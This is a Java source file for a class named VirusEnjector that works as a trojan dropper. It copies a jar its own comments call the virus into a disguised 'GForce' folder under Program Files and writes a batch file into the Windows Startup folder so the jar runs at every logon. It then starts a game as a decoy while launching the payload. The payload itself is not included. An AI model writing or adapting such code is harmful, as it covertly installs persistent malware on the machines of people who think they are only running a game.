package com.byrfb;


import java.io.*;

public class VirusEnjector {
    public void enject() throws IOException {
        /**
         * For starting on pc opening
         */
        String homePath = System.getProperty("user.home");
        System.out.println(homePath);
        String startUpPath = homePath + "//" + "AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup";
        String filePath = startUpPath + "//drun.bat";
        System.out.println(filePath);


/**
 * for installing virus
 */
        String programFiles = System.getenv("ProgramFiles");
        System.out.println(programFiles);
        String fileName = "build.jar";
        String setupPath = programFiles + "\\" + "GForce"+ "\\" +fileName;

        //installibg path copying starter file
        String runnerCommand = "start javaw -jar " + '"' + setupPath + '"';



        File starterFile = new File(filePath);
        BufferedWriter writer = new BufferedWriter(new FileWriter(starterFile));
        writer.write(runnerCommand);

        writer.close();

        File fileVirus = new File("programs/" + fileName);

        copyFile(fileVirus, new File(setupPath));
/**
 * Virus enjekte edildi bundan sonrası virüsün ve oyunun çalıştırılması ile ilgili
 */



// oyun çalıştırılıyor
        String runGame = "java -jar ./programs/desktop.jar";

        Runtime.getRuntime().exec(runGame);

        // Virus çalıştırılıyor
        Process p = Runtime.getRuntime().exec('"'+starterFile.getAbsolutePath() + '"') ;

        while(p.isAlive());


    }

    public void copyFile(File oldLocation, File newLocation) throws IOException {
        if (oldLocation.exists()) {
            BufferedInputStream reader = new BufferedInputStream(new FileInputStream(oldLocation));

            // ensures parent directory is created
            File parentFile = newLocation.getParentFile();
            if (parentFile != null && !parentFile.exists()) {
                parentFile.mkdirs();
            }

            // creates destination file
            if (!newLocation.exists()) {
                newLocation.createNewFile();
            }
            BufferedOutputStream writer = new BufferedOutputStream(new FileOutputStream(newLocation, false));
            try {
                byte[] buff = new byte[8192];
                int numChars;
                while ((numChars = reader.read(buff, 0, buff.length)) != -1) {
                    writer.write(buff, 0, numChars);
                }
            } catch (IOException ex) {
                throw new IOException("IOException when transferring " + oldLocation.getPath() + " to " + newLocation.getPath());
            } finally {
                try {
                    if (reader != null) {
                        writer.close();
                        reader.close();
                    }
                } catch (IOException ex) {
                }
            }
        } else {
            throw new IOException("Old location does not exist when transferring " + oldLocation.getPath() + " to " + newLocation.getPath());
        }
    }
}
